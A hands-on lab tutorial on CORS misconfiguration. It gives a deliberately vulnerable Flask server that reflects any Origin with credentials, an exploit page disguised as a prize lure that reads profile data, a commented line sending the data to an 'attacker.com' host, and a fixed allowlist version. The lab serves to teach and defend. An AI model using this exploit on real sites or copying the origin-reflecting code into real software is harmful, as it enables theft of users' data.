# 06 - Hands-On Lab: Exploiting and Fixing CORS

This self-contained lab sets up a vulnerable Flask API and provides an exploit script to demonstrate how an attacker can steal sensitive data using CORS origin reflection.

## Setup Requirements
- Python 3 installed.
- `flask` and `flask-cors` packages (`pip install flask flask-cors`).

## Part 1: The Vulnerable Server (`server.py`)

Create a file named `server.py` with the following code. This server improperly reflects any `Origin` provided by the client and enables credentials.

```python
from flask import Flask, request, jsonify, make_response

app = Flask(__name__)

@app.route('/api/profile', methods=['GET', 'OPTIONS'])
def get_profile():
    # Vulnerable logic: Reflecting the Origin header blindly
    origin = request.headers.get('Origin')
    
    # Simulate sensitive data that requires authentication
    # (In reality, we would check a session cookie here)
    data = {
        "user_id": 1337,
        "email": "victim@corporate.local",
        "secret_token": "super_secret_auth_token_xyz"
    }
    
    response = make_response(jsonify(data))
    
    # Insecure CORS Configuration
    if origin:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'
    
    return response

if __name__ == '__main__':
    # Run the server on port 5000
    app.run(port=5000, debug=True)
```

Run the server: `python server.py`

## Part 2: The Attacker's Exploit (`exploit.html`)

Create an HTML file simulating a page hosted on an attacker's domain (e.g., `evil.com`). Open this file directly in your browser.

```html
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page - CORS Exploit</title>
</head>
<body>
    <h1>You won a free iPhone!</h1>
    <p>Processing your prize...</p>
    
    <!-- Area to display the stolen data for demonstration -->
    <h3>Stolen Data:</h3>
    <pre id="stolen-data" style="color: red;"></pre>

    <script>
        // Target vulnerable endpoint
        var targetUrl = "http://localhost:5000/api/profile";
        
        var xhr = new XMLHttpRequest();
        xhr.open("GET", targetUrl, true);
        
        // Ensure cookies/credentials are sent with the cross-origin request
        xhr.withCredentials = true; 
        
        xhr.onload = function() {
            if (xhr.status === 200) {
                // The browser permitted the read due to the insecure CORS headers!
                var stolenResponse = xhr.responseText;
                document.getElementById('stolen-data').innerText = stolenResponse;
                
                // In a real attack, exfiltrate data to the attacker's server:
                // fetch("http://attacker.com/log?data=" + btoa(stolenResponse));
            } else {
                document.getElementById('stolen-data').innerText = "Failed to exploit. Status: " + xhr.status;
            }
        };
        
        xhr.onerror = function() {
             document.getElementById('stolen-data').innerText = "CORS Blocked or Network Error.";
        };
        
        xhr.send();
    </script>
</body>
</html>
```

**Observation:** When you open `exploit.html`, the script successfully fetches the sensitive data from `localhost:5000` because the server dynamically replied with `Access-Control-Allow-Origin: null` (if opened locally) or whatever origin the file was served from, along with `Access-Control-Allow-Credentials: true`.

## Part 3: The Remediation (Secure `server.py`)

Stop the previous server and update `server.py` to use a strict allowlist.

```python
from flask import Flask, jsonify
from flask_cors import CORS

app = Flask(__name__)

# Secure Configuration: Strict Allowlist
# Note: DO NOT include 'null' or attacker domains here.
cors_config = {
    "origins": ["http://trusted-frontend.com", "http://localhost:8080"],
    "supports_credentials": True
}

# Apply secure CORS rules to the /api/ route
CORS(app, resources={r"/api/*": cors_config})

@app.route('/api/profile', methods=['GET'])
def get_profile():
    data = {
        "user_id": 1337,
        "email": "victim@corporate.local",
        "secret_token": "super_secret_auth_token_xyz"
    }
    return jsonify(data)

if __name__ == '__main__':
    app.run(port=5000, debug=True)
```

Run the secured server and refresh `exploit.html`. 

**Observation:** The browser console will now show a CORS error (e.g., *Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource...*), and the exploit will fail to read the data.
